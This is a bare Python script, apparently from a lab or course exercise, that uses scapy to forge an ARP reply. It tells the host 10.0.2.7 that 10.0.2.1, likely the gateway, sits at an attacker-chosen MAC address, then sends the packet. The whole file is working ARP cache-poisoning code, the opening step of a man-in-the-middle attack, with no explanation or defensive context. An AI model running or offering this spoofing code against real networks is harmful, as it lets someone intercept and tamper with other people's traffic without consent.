#!/usr/bin/env python

import scapy.all as scapy

packet = scapy.ARP(op=2, pdst="10.0.2.7", hwdst="08:00:27:08:af:07", psrc="10.0.2.1")
scapy.send(packet)